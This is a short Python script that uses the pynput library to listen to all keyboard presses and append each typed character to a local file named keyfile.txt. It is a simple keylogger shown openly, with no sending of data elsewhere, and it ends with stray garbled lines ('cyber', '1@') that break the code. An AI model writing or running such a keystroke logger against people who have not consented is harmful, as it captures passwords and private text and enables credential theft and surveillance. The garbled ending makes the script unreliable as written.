from pynput import keyboard

# Function to append pressed keys to the log
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            #Write the log to a file
            logkey.write(char)
        except:
            print("character not detected!")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    cyber
    1@